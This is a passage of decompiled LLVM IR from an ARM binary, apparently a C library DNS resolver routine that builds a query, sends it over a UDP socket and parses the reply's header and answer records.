  %v2_1616c = add i32 %v2_1619c, 15452
  %v3_1616c = inttoptr i32 %v2_1616c to i32*
  %v4_1616c = load i32, i32* %v3_1616c, align 4
  store i32 %v4_1616c, i32* %r3.global-to-local, align 4
  br i1 %v3_16168, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_16158
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_16158, %bb221
  %v0_16178 = phi i32 [ %stack_var_-468.1, %dec_label_pc_16158 ], [ 0, %bb221 ]
  %v3_16178 = mul i32 %v0_16178, 28
  %v4_16178 = add i32 %v3_16178, %v4_1616c
  store i32 %v4_16178, i32* %r3.global-to-local, align 4
  %v1_16184 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_16190 = urem i32 %v1_16184, 65536
  store i32 14352, i32* %r1.global-to-local, align 4
  %v1_1619c = trunc i32 %v1_16184 to i16
  %v4_1619c = add i32 %v2_1619c, 1800
  %v5_1619c = inttoptr i32 %v4_1619c to i16*
  store i16 %v1_1619c, i16* %v5_1619c, align 2
  store i32 %v0_16178, i32* %r2.global-to-local, align 4
  %v1_161a4 = load i32, i32* @r8, align 4
  %v2_161a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_161a4 = add i32 %v2_161a4, %v1_161a4
  %v4_161a4 = inttoptr i32 %v3_161a4 to i32*
  store i32 %v0_16178, i32* %v4_161a4, align 4
  %v0_161a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_161ac = inttoptr i32 %v0_161a8 to i32*
  %v2_161ac = load i32, i32* %v1_161ac, align 4
  %v3_161ac = add i32 %v0_161a8, 4
  %v4_161ac = inttoptr i32 %v3_161ac to i32*
  %v5_161ac = load i32, i32* %v4_161ac, align 4
  store i32 %v5_161ac, i32* %r1.global-to-local, align 4
  %v6_161ac = add i32 %v0_161a8, 8
  %v7_161ac = inttoptr i32 %v6_161ac to i32*
  %v8_161ac = load i32, i32* %v7_161ac, align 4
  store i32 %v8_161ac, i32* %r2.global-to-local, align 4
  %v9_161ac = add i32 %v0_161a8, 12
  %v10_161ac = inttoptr i32 %v9_161ac to i32*
  %v11_161ac = load i32, i32* %v10_161ac, align 4
  store i32 %v11_161ac, i32* %r3.global-to-local, align 4
  %v4_161b4 = trunc i32 %v2_161ac to i16
  store i16 %v4_161b4, i16* %stack_var_-104, align 2
  %v3_161b8 = add i32 %v0_161a8, 20
  %v4_161b8 = inttoptr i32 %v3_161b8 to i32*
  %v5_161b8 = load i32, i32* %v4_161b8, align 4
  store i32 %v5_161b8, i32* %r1.global-to-local, align 4
  %v6_161b8 = add i32 %v0_161a8, 24
  %v7_161b8 = inttoptr i32 %v6_161b8 to i32*
  %v8_161b8 = load i32, i32* %v7_161b8, align 4
  store i32 %v8_161b8, i32* %r2.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_161cc = load i32, i32* @r8, align 4
  %v2_161cc = add i32 %v0_161cc, 48
  %v3_161cc = inttoptr i32 %v2_161cc to i32*
  %v4_161cc = load i32, i32* %v3_161cc, align 4
  store i32 90584, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_161cc)
  store i32 %v2_161d8, i32* @r6, align 4
  %v0_161dc = load i32, i32* @fp, align 4
  store i32 %v0_161dc, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  %v0_161e4 = load i32, i32* @sl, align 4
  %v3_161e8 = inttoptr i32 %v0_161e4 to i8*
  %v4_161e8 = call i32 @__GI_memset(i8* %v3_161e8, i32 %v0_161dc, i32 512)
  %v0_161ec = load i32, i32* @fp, align 4
  store i32 %v0_161ec, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v4_161f8 = call i32 @__GI_memset(i8* %v3_161f8, i32 %v0_161ec, i32 48)
  store i32 %v3_16190, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_16208 = load i32, i32* @sl, align 4
  store i32 %v0_16208, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 %v3_16190, i32* %stack_var_-192, align 4
  %v6_1621c = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_16208, i32 512, i32 %v3_16190, i32 %v3_16190)
  store i32 %v6_1621c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16220 = icmp slt i32 %v6_1621c, 0
  br i1 %v1_16220, label %dec_label_pc_166fc, label %dec_label_pc_16228

dec_label_pc_16228:                               ; preds = %bb222
  store i32 %v0_15fa0, i32* @ip, align 4
  store i32 %v1_15fe8, i32* @r5, align 4
  %v0_16238 = load i32, i32* @sl, align 4
  %v2_16238 = add i32 %v0_16238, %v6_1621c
  store i32 %v2_16238, i32* %r1.global-to-local, align 4
  %v1_1623c = sub i32 512, %v6_1621c
  store i32 %v1_1623c, i32* %r2.global-to-local, align 4
  store i32 %v1_15fe8, i32* %stack_var_-60, align 4
  %v4_16248 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_16238, i32 %v1_1623c)
  store i32 %v4_16248, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1624c = icmp slt i32 %v4_16248, 0
  br i1 %v1_1624c, label %dec_label_pc_166fc, label %dec_label_pc_16254

dec_label_pc_16254:                               ; preds = %dec_label_pc_16228
  %v3_16258 = load i16, i16* %stack_var_-104, align 2
  %v4_16258 = sext i16 %v3_16258 to i32
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_16264 = call i32 @socket(i32 %v4_16258, i32 2, i32 17)
  store i32 %v3_16264, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16268 = icmp slt i32 %v3_16264, 0
  br i1 %v1_16268, label %dec_label_pc_166d4, label %dec_label_pc_16274

dec_label_pc_16274:                               ; preds = %dec_label_pc_16254
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_161b0, i32* %r1.global-to-local, align 4
  %v3_1627c = call i32 @__libc_connect(i32 %v3_16264, i32 %v2_161b0, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16280 = icmp slt i32 %v3_1627c, 0
  br i1 %v1_16280, label %dec_label_pc_166d4, label %dec_label_pc_16288

dec_label_pc_16288:                               ; preds = %dec_label_pc_16274
  %v0_16288 = load i32, i32* @r5, align 4
  %v1_16288 = load i32, i32* @r4, align 4
  %v2_16288 = add i32 %v1_16288, %v0_16288
  store i32 %v2_16288, i32* %r2.global-to-local, align 4
  %v0_1628c = load i32, i32* @fp, align 4
  store i32 %v0_1628c, i32* %r3.global-to-local, align 4
  %v0_16294 = load i32, i32* @sl, align 4
  store i32 %v0_16294, i32* %r1.global-to-local, align 4
  %v4_16298 = call i32 @__libc_send(i32 %v3_16264, i32 %v0_16294, i32 %v2_16288, i32 %v0_1628c)
  store i32 1802, i32* %r3.global-to-local, align 4
  %v0_162a0 = load i32, i32* @r8, align 4
  %v2_162a0 = add i32 %v0_162a0, 1802
  %v3_162a0 = inttoptr i32 %v2_162a0 to i8*
  %v4_162a0 = load i8, i8* %v3_162a0, align 1
  %v6_162a0 = zext i8 %v4_162a0 to i32
  store i32 %v6_162a0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_162a8 = mul nuw nsw i32 %v6_162a0, 1000
  store i32 %v2_162a8, i32* @r4, align 4
  store i32 %v2_162ac, i32* @r5, align 4
  br label %dec_label_pc_162b0

dec_label_pc_162b0:                               ; preds = %thread-pre-split, %dec_label_pc_16288
  %v0_162c0 = phi i32 [ %v1_162fc, %thread-pre-split ], [ %v2_162a8, %dec_label_pc_16288 ]
  store i32 %v3_16264, i32* %stack_var_-48, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v0_162c0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v8_162d0 = call i32 @__GI_poll(i32 %v2_162ac, i32 1, i32 %v0_162c0, i32 1, i32 %v3_16264, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_162d8 = load i32, i32* @sl, align 4
  store i32 %v0_162d8, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp223 = icmp slt i32 %v8_162d0, 1
  br i1 %tmp223, label %dec_label_pc_166d4, label %dec_label_pc_162ec

dec_label_pc_162ec:                               ; preds = %dec_label_pc_162b0
  %v4_162ec = call i32 @__libc_recv(i32 %v3_16264, i32 %v0_162d8, i32 512, i32 64)
  %v2_162f0 = icmp ugt i32 %v4_162ec, 10
  store i1 %v2_162f0, i1* %cpsr_c.global-to-local, align 1
  %v8_162f8 = icmp sgt i32 %v4_162ec, 11
  br i1 %v8_162f8, label %dec_label_pc_16324, label %dec_label_pc_162fc

dec_label_pc_162fc:                               ; preds = %dec_label_pc_16324, %dec_label_pc_16340, %dec_label_pc_162ec
  %v0_162fc = load i32, i32* @r4, align 4
  %v1_162fc = add i32 %v0_162fc, -1000
  store i32 %v1_162fc, i32* @r4, align 4
  %v7_162fc = icmp eq i32 %v0_162fc, 1000
  %tmp286 = zext i1 %v7_162fc to i32
  %. = xor i32 %tmp286, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1630c = icmp slt i32 %v4_162ec, 0
  br i1 %v1_1630c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_162fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_166d4

thread-pre-split:                                 ; preds = %dec_label_pc_162fc
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_162fc, label %dec_label_pc_166d4, label %dec_label_pc_162b0

dec_label_pc_16324:                               ; preds = %dec_label_pc_162ec
  %v0_16324 = load i32, i32* @sl, align 4
  store i32 %v2_161d8, i32* %r1.global-to-local, align 4
  %v2_1632c = inttoptr i32 %v0_16324 to i8*
  %v3_1632c = call i32 @__decode_header(i8* %v2_1632c, i32 %v2_161d8)
  %v3_16330 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_16330, i32* %r3.global-to-local, align 4
  %v3_16338 = icmp uge i32 %v3_16330, %v3_16190
  store i1 %v3_16338, i1* %cpsr_c.global-to-local, align 1
  %v9_16338 = icmp eq i32 %v3_16330, %v3_16190
  br i1 %v9_16338, label %dec_label_pc_16340, label %dec_label_pc_162fc

dec_label_pc_16340:                               ; preds = %dec_label_pc_16324
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_16344, label %dec_label_pc_162fc, label %dec_label_pc_1634c

dec_label_pc_1634c:                               ; preds = %dec_label_pc_16340
  store i32 %tmp164, i32* %r2.global-to-local, align 4
  store i32 %v1_16350, i32* %r3.global-to-local, align 4
  store i1 %v2_16354, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_16350.cmp, label %dec_label_pc_16390, label %dec_label_pc_1635c

dec_label_pc_1635c:                               ; preds = %dec_label_pc_1634c
  store i32 %v4_16018, i32* @r1, align 4
  store i1 %v2_16360, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_16360, label %dec_label_pc_1637c, label %dec_label_pc_16368

dec_label_pc_16368:                               ; preds = %dec_label_pc_1635c
  store i32 %v4_160dc, i32* %r2.global-to-local, align 4
  %v1_1636c = add i32 %v4_160dc, -1
  store i32 %v1_1636c, i32* %r3.global-to-local, align 4
  %v0_16370 = load i32, i32* @r7, align 4
  %v3_16370 = icmp uge i32 %v0_16370, %v1_1636c
  store i1 %v3_16370, i1* %cpsr_c.global-to-local, align 1
  %v5_16374 = icmp slt i32 %v0_16370, %v1_1636c
  br i1 %v5_16374, label %.thread8, label %dec_label_pc_1637c

.thread8:                                         ; preds = %dec_label_pc_16368
  %v7_16374 = add i32 %v0_16370, 1
  br label %dec_label_pc_166e4

dec_label_pc_1637c:                               ; preds = %dec_label_pc_16368, %dec_label_pc_1635c
  store i32 56480, i32* %r3.global-to-local, align 4
  %v0_16380 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_163c0

dec_label_pc_16390:                               ; preds = %dec_label_pc_1634c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_16390, label %dec_label_pc_16398, label %dec_label_pc_166d4

dec_label_pc_16398:                               ; preds = %dec_label_pc_16390
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp218, label %dec_label_pc_163b0, label %dec_label_pc_163c8

dec_label_pc_163b0:                               ; preds = %dec_label_pc_16398
  store i32 56428, i32* %r3.global-to-local, align 4
  %v0_163b4 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %dec_label_pc_1637c, %dec_label_pc_163b0
  %storemerge3 = phi i32 [ %v0_16380, %dec_label_pc_1637c ], [ %v0_163b4, %dec_label_pc_163b0 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1637c ], [ 4, %dec_label_pc_163b0 ]
  %storemerge2 = load i32, i32* @global_var_2402c.512, align 4
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_163c0 = add i32 %storemerge2, %storemerge3
  %v4_163c0 = inttoptr i32 %v3_163c0 to i32*
  store i32 %storemerge, i32* %v4_163c0, align 4
  br label %dec_label_pc_16724

dec_label_pc_163c8:                               ; preds = %dec_label_pc_16398
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_163cc.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @r7, align 4
  %v2_163cc = add i32 %v0_163cc.pre, 12
  store i32 %v2_163cc, i32* @r4, align 4
  %v3_163cc = icmp ugt i32 %v0_163cc.pre, -13
  store i1 %v3_163cc, i1* %cpsr_c.global-to-local, align 1
  %v9_163cc = icmp eq i32 %v2_163cc, 0
  br i1 %v9_163cc, label %dec_label_pc_166d4, label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %dec_label_pc_163c8
  %v2_163dc = add i32 %v4_162ec, -12
  store i32 %v2_163dc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp227 = icmp slt i32 %v2_163dc, 1
  br i1 %tmp227, label %dec_label_pc_166d4, label %dec_label_pc_163e8

dec_label_pc_163e0thread-pre-split:               ; preds = %dec_label_pc_16404
  %v2_1641016 = add i32 %v2_163f4, -1
  store i32 %v2_1641016, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp228 = icmp slt i32 %v2_1641016, 1
  br i1 %tmp228, label %dec_label_pc_166d4, label %dec_label_pc_163e8

dec_label_pc_163e8:                               ; preds = %dec_label_pc_163d4, %dec_label_pc_163e0thread-pre-split
  %v1_1640c = phi i32 [ %v2_1641016, %dec_label_pc_163e0thread-pre-split ], [ %v2_163dc, %dec_label_pc_163d4 ]
  %v0_163e8 = phi i32 [ %v2_163fc, %dec_label_pc_163e0thread-pre-split ], [ %v2_163cc, %dec_label_pc_163d4 ]
  %v1_163e8 = inttoptr i32 %v0_163e8 to i8*
  %v2_163e8 = load i8, i8* %v1_163e8, align 1
  %v3_163e8 = zext i8 %v2_163e8 to i32
  store i32 %v3_163e8, i32* %r3.global-to-local, align 4
  %v5_163e8 = add i32 %v0_163e8, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163ec = icmp eq i8 %v2_163e8, 0
  store i32 %v5_163e8, i32* %r2.global-to-local, align 4
  %v2_163f4 = sub i32 %v1_1640c, %v3_163e8
  store i32 %v2_163f4, i32* @lr, align 4
  %v2_163fc = add i32 %v3_163e8, %v5_163e8
  br i1 %v2_163ec, label %dec_label_pc_16418, label %dec_label_pc_16404

dec_label_pc_16404:                               ; preds = %dec_label_pc_163e8
  %v1_163f8 = and i32 %v3_163e8, 192
  %v2_16404 = icmp eq i32 %v1_163f8, 192
  store i1 %v2_16404, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_16404, label %.thread10, label %dec_label_pc_163e0thread-pre-split

.thread10:                                        ; preds = %dec_label_pc_16404
  %v2_16408 = add i32 %v0_163e8, 2
  store i32 %v2_16408, i32* %r2.global-to-local, align 4
  %v2_1640c = add i32 %v1_1640c, -2
  store i32 %v2_1640c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %dec_label_pc_163e8, %.thread10
  %v1_16424 = phi i32 [ %v2_16408, %.thread10 ], [ %v5_163e8, %dec_label_pc_163e8 ]
  %v0_16418 = phi i32 [ %v2_1640c, %.thread10 ], [ %v1_1640c, %dec_label_pc_163e8 ]
  %v1_16418 = add i32 %v0_16418, -3
  %v2_16418 = icmp ugt i32 %v0_16418, 2
  store i1 %v2_16418, i1* %cpsr_c.global-to-local, align 1
  %v3_16418 = sub i32 2, %v0_16418
  %v4_16418 = and i32 %v3_16418, %v0_16418
  %v5_16418 = icmp slt i32 %v4_16418, 0
  %v6_16418 = icmp slt i32 %v1_16418, 0
  %v7_16418 = icmp eq i32 %v0_16418, 3
  %v3_1641c = xor i1 %v6_16418, %v5_16418
  %v4_1641c = or i1 %v7_16418, %v3_1641c
  br i1 %v4_1641c, label %dec_label_pc_166d4, label %dec_label_pc_16420

dec_label_pc_16420:                               ; preds = %dec_label_pc_16418
  %v1_16420 = sub i32 -8, %v0_163cc.pre
  %v2_16424 = add i32 %v1_16424, %v1_16420
  store i32 %v2_16424, i32* %r3.global-to-local, align 4
  %v3_16424 = icmp ult i32 %v2_16424, %v1_16420
  store i1 %v3_16424, i1* %cpsr_c.global-to-local, align 1
  %v8_16424 = icmp slt i32 %v2_16424, 0
  br i1 %v8_16424, label %dec_label_pc_166d4, label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %dec_label_pc_16420
  %v2_16430 = add i32 %v2_16424, 12
  store i32 1, i32* @r1, align 4
  store i32 %v2_16454, i32* @r5, align 4
  %v1_16468 = load i32, i32* @sb, align 4
  %v2_16468 = inttoptr i32 %v1_16468 to i32*
  store i32 0, i32* %v2_16468, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_166a857, label %dec_label_pc_16470, label %dec_label_pc_166ac

dec_label_pc_16470:                               ; preds = %dec_label_pc_16448, %dec_label_pc_16684
  %stack_var_-460.365 = phi i32 [ %v2_1668c, %dec_label_pc_16684 ], [ %v2_16430, %dec_label_pc_16448 ]
  %stack_var_-452.062 = phi i32 [ %v1_16690, %dec_label_pc_16684 ], [ 0, %dec_label_pc_16448 ]
  %stack_var_-480.261 = phi i32 [ %stack_var_-480.1, %dec_label_pc_16684 ], [ 1, %dec_label_pc_16448 ]
  %v0_16470 = load i32, i32* @sl, align 4
  store i32 %stack_var_-460.365, i32* @r1, align 4
  store i32 %v4_162ec, i32* %r2.global-to-local, align 4
  store i32 %v2_16450, i32* %r3.global-to-local, align 4
  store i32 256, i32* @r7, align 4
  %v5_16488 = call i32 @__decode_dotted(i32 %v0_16470, i32 %stack_var_-460.365, i32 %v4_162ec, i32 %v2_16450, i32 256)
  store i32 %v5_16488, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1648c = icmp slt i32 %v5_16488, 0
  br i1 %v1_1648c, label %dec_label_pc_1655c, label %dec_label_pc_16494

dec_label_pc_16494:                               ; preds = %dec_label_pc_16470
  %v1_1649c = add i32 %v5_16488, 10
  store i32 %v1_1649c, i32* @fp, align 4
  %v2_164a0 = sub i32 %v4_162ec, %stack_var_-460.365
  %v2_164a4 = sub i32 %v2_164a0, %v1_1649c
  store i32 %v2_164a4, i32* %r3.global-to-local, align 4
  %v3_164a4 = icmp uge i32 %v2_164a0, %v1_1649c
  store i1 %v3_164a4, i1* %cpsr_c.global-to-local, align 1
  %v8_164a4 = icmp slt i32 %v2_164a4, 0
  br i1 %v8_164a4, label %dec_label_pc_16554.thread, label %dec_label_pc_164b4

dec_label_pc_16554.thread:                        ; preds = %dec_label_pc_16494
  store i32 %v2_164a4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1655c

dec_label_pc_164b4:                               ; preds = %dec_label_pc_16494
  %v2_164b8 = call i32 @__GI_strdup(i8* %v1_164b8)
  %v0_164c0 = load i32, i32* @r4, align 4
  %v2_164c0 = add i32 %v0_164c0, %stack_var_-460.365
  %v0_164c4 = load i32, i32* @sl, align 4
  %v2_164c4 = add i32 %v0_164c4, %v2_164c0
  store i32 %v2_164c4, i32* %r1.global-to-local, align 4
  %v1_164c8 = add i32 %v2_164c4, 2
  %v1_164cc = add i32 %v2_164c4, 4
  store i32 %v1_164cc, i32* %r3.global-to-local, align 4
  %v1_164d0 = add i32 %v2_164c4, 5
  %v2_164d0 = inttoptr i32 %v1_164d0 to i8*
  %v3_164d0 = load i8, i8* %v2_164d0, align 1
  %v4_164d0 = zext i8 %v3_164d0 to i32
  %v2_164d4 = inttoptr i32 %v1_164cc to i8*
  %v3_164d4 = load i8, i8* %v2_164d4, align 1
  %v4_164d4 = zext i8 %v3_164d4 to i32
  %v1_164d8 = add i32 %v2_164c4, 8
  %v2_164d8 = inttoptr i32 %v1_164d8 to i8*
  %v3_164d8 = load i8, i8* %v2_164d8, align 1
  %v4_164d8 = zext i8 %v3_164d8 to i32
  %v1_164dc = add i32 %v2_164c4, 7
  %v2_164dc = inttoptr i32 %v1_164dc to i8*
  %v3_164dc = load i8, i8* %v2_164dc, align 1
  %v4_164dc = zext i8 %v3_164dc to i32
  store i32 %v4_164dc, i32* %r2.global-to-local, align 4
  %v1_164e4 = add i32 %v2_164c4, 6
  %v2_164e4 = inttoptr i32 %v1_164e4 to i8*
  %v3_164e4 = load i8, i8* %v2_164e4, align 1
  %v4_164e4 = zext i8 %v3_164e4 to i32
  store i32 %v4_164e4, i32* %r3.global-to-local, align 4
  %v1_164e8 = add i32 %v2_164c4, 9
  %v2_164e8 = inttoptr i32 %v1_164e8 to i8*
  %v3_164e8 = load i8, i8* %v2_164e8, align 1
  %v4_164e8 = zext i8 %v3_164e8 to i32
  %v3_164f0 = inttoptr i32 %v2_164c4 to i8*
  %v4_164f0 = load i8, i8* %v3_164f0, align 1
  %v6_164f0 = zext i8 %v4_164f0 to i32
  %v1_164f4 = add i32 %v2_164c4, 3
  %v2_164f4 = inttoptr i32 %v1_164f4 to i8*
  %v3_164f4 = load i8, i8* %v2_164f4, align 1
  %v4_164f4 = zext i8 %v3_164f4 to i32
  store i32 %v4_164f4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_164f8 = mul nuw i32 %v4_164d4, 16777216
  %v5_164f8 = or i32 %v4_164dc, %v4_164f8
  store i32 %v5_164f8, i32* %r2.global-to-local, align 4
  %v2_164fc = inttoptr i32 %v1_164c8 to i8*
  %v3_164fc = load i8, i8* %v2_164fc, align 1
  %v4_164fc = zext i8 %v3_164fc to i32
  %v1_16500 = add i32 %v2_164c4, 1
  %v2_16500 = inttoptr i32 %v1_16500 to i8*
  %v3_16500 = load i8, i8* %v2_16500, align 1
  %v4_16500 = zext i8 %v3_16500 to i32
  %v4_16504 = mul nuw nsw i32 %v4_164d8, 256
  %v5_16504 = or i32 %v4_164e8, %v4_16504
  store i32 %v5_16504, i32* @r6, align 4
  store i32 %v4_164d0, i32* @r7, align 4
  %v4_1650c = mul nuw nsw i32 %v6_164f0, 256
  %v5_1650c = or i32 %v4_16500, %v4_1650c
  store i32 %v5_1650c, i32* @lr, align 4
  %v4_16510 = mul nuw nsw i32 %v4_164fc, 256
  %v5_16510 = or i32 %v4_16510, %v4_164f4
  store i32 %v5_16510, i32* %r3.global-to-local, align 4
  store i32 %v2_164a4, i32* @r5, align 4
  %v4_1651c = mul nuw nsw i32 %v4_164d0, 65536
  %v5_1651c = or i32 %v5_164f8, %v4_1651c
  %v4_16520 = mul nuw nsw i32 %v4_164e4, 256
  %v5_16520 = or i32 %v5_1651c, %v4_16520
  store i32 %v5_16520, i32* %r2.global-to-local, align 4
  %v1_16524 = add i32 %v2_164c4, 10
  store i32 %v1_16524, i32* @r1, align 4
  %v1_16528 = add i32 %v2_164c0, 10
  store i32 %v1_16528, i32* @r4, align 4
  %v2_1652c = sub i32 %v2_164a4, %v5_16504
  %v3_1652c = icmp uge i32 %v2_164a4, %v5_16504
  store i1 %v3_1652c, i1* %cpsr_c.global-to-local, align 1
  %tmp230 = sub i32 0, %v2_1652c
  %v6_1652c = and i32 %v2_164a4, %tmp230
  %v7_1652c = icmp slt i32 %v6_1652c, 0
  %v8_1652c = icmp slt i32 %v2_1652c, 0
  store i32 %v2_164b8, i32* %stack_var_-144, align 4
  %v2_1654c = xor i1 %v8_1652c, %v7_1652c
  br i1 %v2_1654c, label %dec_label_pc_1655c, label %dec_label_pc_16554

dec_label_pc_16554:                               ; preds = %dec_label_pc_164b4
  %v0_16550 = load i32, i32* @fp, align 4
  %v2_16550 = add i32 %v0_16550, %v5_16504
  store i32 %v2_16550, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16554 = icmp slt i32 %v2_16550, 0
  br i1 %v1_16554, label %dec_label_pc_1655c, label %dec_label_pc_16578

dec_label_pc_1655c:                               ; preds = %dec_label_pc_16554, %dec_label_pc_164b4, %dec_label_pc_16470, %dec_label_pc_16554.thread
  store i32 %stack_var_-452.062, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16560 = icmp eq i32 %stack_var_-452.062, 0
  br i1 %v2_16560, label %dec_label_pc_166d4, label %dec_label_pc_16568

dec_label_pc_16568:                               ; preds = %dec_label_pc_1655c
  store i32 %tmp148, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1656c, label %dec_label_pc_166d4, label %dec_label_pc_166ac

dec_label_pc_16578:                               ; preds = %dec_label_pc_16554
  store i32 %stack_var_-480.261, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1657c = icmp eq i32 %stack_var_-480.261, 0
  br i1 %v2_1657c, label %dec_label_pc_1662c, label %dec_label_pc_16584

dec_label_pc_16584:                               ; preds = %dec_label_pc_16578
  %v0_16584 = load i32, i32* @sb, align 4
  %v1_16584 = add i32 %v0_16584, 28
  %v2_16584 = inttoptr i32 %v1_16584 to i32*
  %v3_16584 = load i32, i32* %v2_16584, align 4
  store i32 %v3_16584, i32* @r3, align 4
  %v1_16588 = add i32 %v0_16584, 32
  %v2_16588 = inttoptr i32 %v1_16588 to i32*
  %v3_16588 = load i32, i32* %v2_16588, align 4
  store i32 %v3_16588, i32* %r2.global-to-local, align 4
  %v1_1658c = add i32 %v0_16584, 36
  %v2_1658c = inttoptr i32 %v1_1658c to i32*
  %v3_1658c = load i32, i32* %v2_1658c, align 4
  store i32 %v3_1658c, i32* %r1.global-to-local, align 4
  %v1_16590 = inttoptr i32 %v0_16584 to i32*
  %v2_16590 = load i32, i32* %v1_16590, align 4
  store i32 %v2_16590, i32* @r0, align 4
  %v0_165a0 = call i32 @free()
  store i32 40, i32* @r2, align 4
  %v0_165a8 = load i32, i32* @sb, align 4
  store i32 %v0_165a8, i32* @r0, align 4
  store i32 %v2_16454, i32* @r1, align 4
  %v0_165b0 = call i32 @memcpy()
  %v0_165b4 = load i32, i32* @sb, align 4
  %v1_165b4 = add i32 %v0_165b4, 4
  %v2_165b4 = inttoptr i32 %v1_165b4 to i32*
  %v3_165b4 = load i32, i32* %v2_165b4, align 4
  store i32 %v3_165b4, i32* %r2.global-to-local, align 4
  %v2_165b8 = icmp ugt i32 %v3_165b4, 23
  store i1 %v2_165b8, i1* %cpsr_c.global-to-local, align 1
  %v7_165b8 = icmp eq i32 %v3_165b4, 24
  br i1 %v7_165b8, label %dec_label_pc_165dc, label %dec_label_pc_165c0

dec_label_pc_165c0:                               ; preds = %dec_label_pc_16584
  %v1_165c0 = add i32 %v0_165b4, 28
  %v2_165c0 = inttoptr i32 %v1_165c0 to i32*
  %v3_165c0 = load i32, i32* %v2_165c0, align 4
  store i32 %v3_165c0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165c4 = icmp eq i32 %v3_165c0, 0
  br i1 %v2_165c4, label %dec_label_pc_166ac, label %dec_label_pc_165cc

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165c0
  store i1 %v2_165d0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_165d0, label %dec_label_pc_165dc, label %bb231

bb231:                                            ; preds = %dec_label_pc_165cc
  store i1 %v3_165d4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_165d4, label %dec_label_pc_165dc, label %dec_label_pc_166ac

dec_label_pc_165dc:                               ; preds = %dec_label_pc_165cc, %bb231, %dec_label_pc_16584
  store i32 %v0_15fa0, i32* %r1.global-to-local, align 4
  %v3_165e0 = icmp uge i32 %v3_165b4, %v0_15fa0
  store i1 %v3_165e0, i1* %cpsr_c.global-to-local, align 1
  %v9_165e0 = icmp eq i32 %v3_165b4, %v0_15fa0
  br i1 %v9_165e0, label %dec_label_pc_165f0, label %bb232

